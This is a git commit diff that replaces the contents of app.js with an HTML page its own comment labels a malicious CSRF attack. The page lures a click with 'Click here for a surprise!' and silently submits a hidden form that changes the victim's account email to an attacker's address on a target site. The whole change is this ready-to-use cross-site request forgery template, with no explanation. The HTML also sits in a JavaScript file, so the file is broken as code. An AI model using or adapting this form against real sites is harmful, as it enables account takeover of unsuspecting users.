d4b9b8fff6002c4c666564bf6a744adb31b5de51
axeltomilive <harold.ramirez-r@uniminuto.edu.co>
2024-12-06 00:05:41 -0500

    Update app.js

--- app.js
+++ app.js
@@ -1,6 +1,15 @@
-exit
-close
-bye
-
-
-.
+<!-- Malicious HTML form -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF Attack</title>
+</head>
+<body>
+  <h1>Click here for a surprise!</h1>
+  <form action="http://example.com/update-email" method="POST">
+    <input type="hidden" name="email" value="attacker@example.com">
+    <input type="submit" value="Click Me!">
+  </form>
+</body>
+</html>
